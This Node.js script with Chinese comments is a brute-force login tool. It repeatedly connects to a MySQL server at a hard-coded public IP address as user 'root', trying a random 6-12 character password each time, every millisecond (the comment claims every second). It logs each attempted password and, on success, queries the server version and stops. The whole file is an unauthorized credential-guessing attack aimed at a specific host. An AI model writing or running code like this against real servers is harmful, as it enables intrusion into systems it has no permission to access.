const mysql = require('mysql2/promise'); // 使用 promise 版本便于异步处理

// 生成6-12位包含数字、大小写字母、特殊字符的随机密码
function generateRandomPassword() {
  const length = Math.floor(Math.random() * 7) + 6; // 6-12位
  const charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()';
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * charset.length);
    password += charset[randomIndex];
  }
  return password;
}

// 数据库连接配置
const dbConfig = {
  host: '115.190.9.242',
  port: 3306,
  user: 'root',
  // 密码将在每次连接时动态生成
};

let timeId = null;

// 定时连接数据库的函数
async function connectToDatabase() {
  const password = generateRandomPassword();
  let connection;
  try {
    // 建立连接
    connection = await mysql.createConnection({
      ...dbConfig,
      password
    });
    console.log(`[${new Date().toISOString()}] 数据库连接成功，使用密码: ${password}`);
    
    // 可以在这里执行简单的查询操作，例如查询数据库版本
    const [rows] = await connection.execute('SELECT version()');
    console.log('数据库版本:', rows[0]['version()']);
    clearInterval(timeId);
    throw new Error('11111')
  } catch (error) {
    console.error(`[${new Date().toISOString()}] 数据库连接失败，使用密码: ${password}，错误:`, error.message);
  } finally {
    // 确保连接关闭，避免资源泄露
    if (connection) {
      try {
        await connection.end();
        console.log(`[${new Date().toISOString()}] 数据库连接已关闭`);
      } catch (closeError) {
        console.error('关闭连接时出错:', closeError.message);
      }
    }
  }
}

// 每1000毫秒执行一次连接
timeId = setInterval(connectToDatabase, 1);
